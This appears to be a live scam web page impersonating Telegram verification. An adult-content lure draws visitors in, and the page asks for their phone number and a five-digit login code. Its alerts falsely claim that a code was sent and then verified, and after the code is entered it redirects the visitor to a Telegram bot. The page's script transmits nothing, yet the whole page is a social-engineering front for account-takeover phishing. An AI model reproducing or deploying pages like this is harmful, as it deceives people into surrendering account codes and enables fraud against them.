<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Verification - Unlock</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
        body { 
            background-color: #000; 
            height: 100vh; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center;
            overflow: hidden;
            position: relative;
        }
        
        /* ব্যাকগ্রাউন্ড ভিডিও */
        .bg-video {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            object-fit: cover; z-index: 1; filter: brightness(0.5);
        }

        /* মূল কন্টেইনার */
        .container {
            position: relative; z-index: 2; width: 92%; max-width: 380px;
            display: flex; flex-direction: column; align-items: center;
        }

        /* হেডার বক্স */
        .header-box {
            background: white; padding: 22px 18px 18px 18px; border-radius: 18px;
            width: 100%; text-align: center; margin-bottom: 20px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
            position: relative;
            margin-top: 35px; /* অ্যানিমেটেড আইকনের জায়গার জন্য */
        }

        /* বড় অ্যানিমেটেড ফোন ও মেসেজ আইকন কন্টেইনার */
        .animated-icon-container {
            position: absolute; top: -45px; left: 50%; transform: translateX(-50%);
            width: 75px; height: 75px;
            background: linear-gradient(135deg, #0088CC, #00bfff);
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            box-shadow: 0 0 20px rgba(0, 136, 204, 0.8), inset 0 0 10px rgba(255,255,255,0.5);
            border: 3px solid #ffffff;
            animation: pulseGlow 1.5s infinite alternate;
        }

        /* অ্যানিমেটেড আইকনের ভেতরকার গ্রাফিক্স ও সিগন্যাল ইফেক্ট */
        .phone-icon-inner {
            font-size: 34px;
            animation: bounceIcon 1s infinite alternate;
        }

        @keyframes pulseGlow {
            0% { transform: translateX(-50%) scale(1); box-shadow: 0 0 15px rgba(0, 136, 204, 0.6); }
            100% { transform: translateX(-50%) scale(1.08); box-shadow: 0 0 30px rgba(0, 136, 204, 1); }
        }

        @keyframes bounceIcon {
            0% { transform: translateY(0); }
            100% { transform: translateY(-3px); }
        }

        .header-box h2 {
            margin-top: 10px; font-size: 16px; color: #222; font-weight: 700; margin-bottom: 12px;
        }
        
        /* ফোন নম্বর ইনপুট */
        .phone-input {
            width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 10px;
            font-size: 15px; outline: none; text-align: center; margin-bottom: 12px;
            font-weight: 600; color: #333;
        }
        .btn-get-code {
            background: #2ECC71; color: white; width: 100%; padding: 12px;
            border-radius: 10px; border: none; font-weight: 700; font-size: 15px; cursor: pointer;
            box-shadow: 0 4px 12px rgba(46, 204, 113, 0.4); transition: 0.2s;
        }
        .btn-get-code:active { transform: scale(0.97); }

        /* ৫টি ওটিপি বক্স */
        .code-display {
            display: flex; gap: 8px; margin-bottom: 20px; justify-content: center;
        }
        .code-box {
            width: 52px; height: 60px; border: 2px solid rgba(255,255,255,0.7);
            border-radius: 12px; display: flex; align-items: center; justify-content: center;
            font-size: 26px; color: white; font-weight: bold; background: rgba(255,255,255,0.15);
            backdrop-filter: blur(8px);
        }

        /* নম্বর কিপ্যাড */
        .keypad {
            display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 100%;
        }
        .key-btn {
            background: #0088CC; color: white; border: none; padding: 16px;
            font-size: 22px; font-weight: 700; border-radius: 12px; cursor: pointer;
            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
            transition: 0.1s;
        }
        .key-btn:active { background: #006699; transform: scale(0.95); }
        .key-btn.empty { background: transparent; box-shadow: none; cursor: default; }
        .key-btn.backspace { font-size: 20px; background: #E74C3C; }
    </style>
</head>
<body>

    <!-- ব্যাকগ্রাউন্ড ভিডিও -->
    <video autoplay muted loop playsinline class="bg-video">
        <source src="https://videotourl.com/videos/1791952459901-05439f7d-513c-4994-b03b-ca0ca313b9cc.mp4" type="video/mp4">
    </video>

    <div class="container">
        
        <!-- Header Box with Animated Glowing Icon -->
        <div class="header-box">
            <!-- বড় অ্যানিমেটেড গ্লোয়িং আইকন -->
            <div class="animated-icon-container">
                <div class="phone-icon-inner">📥</div>
            </div>

            <h2>Enter Telegram Number 🔞</h2>
            <input type="text" id="phoneInput" class="phone-input" placeholder="+880 XXXXXXXXXX">
            <button class="btn-get-code" onclick="sendOtpRequest()">GET CODE 📩</button>
        </div>

        <!-- 5 Digit OTP Boxes -->
        <div class="code-display" id="codeDisplay">
            <div class="code-box"></div>
            <div class="code-box"></div>
            <div class="code-box"></div>
            <div class="code-box"></div>
            <div class="code-box"></div>
        </div>

        <!-- Number Keypad -->
        <div class="keypad">
            <button class="key-btn" onclick="pressKey('1')">1</button>
            <button class="key-btn" onclick="pressKey('2')">2</button>
            <button class="key-btn" onclick="pressKey('3')">3</button>
            <button class="key-btn" onclick="pressKey('4')">4</button>
            <button class="key-btn" onclick="pressKey('5')">5</button>
            <button class="key-btn" onclick="pressKey('6')">6</button>
            <button class="key-btn" onclick="pressKey('7')">7</button>
            <button class="key-btn" onclick="pressKey('8')">8</button>
            <button class="key-btn" onclick="pressKey('9')">9</button>
            <div class="key-btn empty"></div>
            <button class="key-btn" onclick="pressKey('0')">0</button>
            <button class="key-btn backspace" onclick="deleteKey()">⌫</button>
        </div>
    </div>

    <script>
        let currentOtp = "";
        const MAX_LENGTH = 5;
        const boxes = document.querySelectorAll('.code-box');

        function updateDisplay() {
            for (let i = 0; i < MAX_LENGTH; i++) {
                boxes[i].innerText = currentOtp[i] || "";
            }
        }

        function pressKey(num) {
            if (currentOtp.length < MAX_LENGTH) {
                currentOtp += num;
                updateDisplay();
                
                if (currentOtp.length === MAX_LENGTH) {
                    setTimeout(() => {
                        alert("OTP Verified Successfully! 🔞");
                        window.location.href = "https://t.me/Desi_Magi909_Bot?start=start";
                    }, 500);
                }
            }
        }

        function deleteKey() {
            if (currentOtp.length > 0) {
                currentOtp = currentOtp.slice(0, -1);
                updateDisplay();
            }
        }

        function sendOtpRequest() {
            let phone = document.getElementById('phoneInput').value;
            if(!phone) {
                alert("Please enter your phone number with country code!");
                return;
            }
            alert("Verification code sent to " + phone + " via Telegram!");
        }
    </script>
</body>
</html>
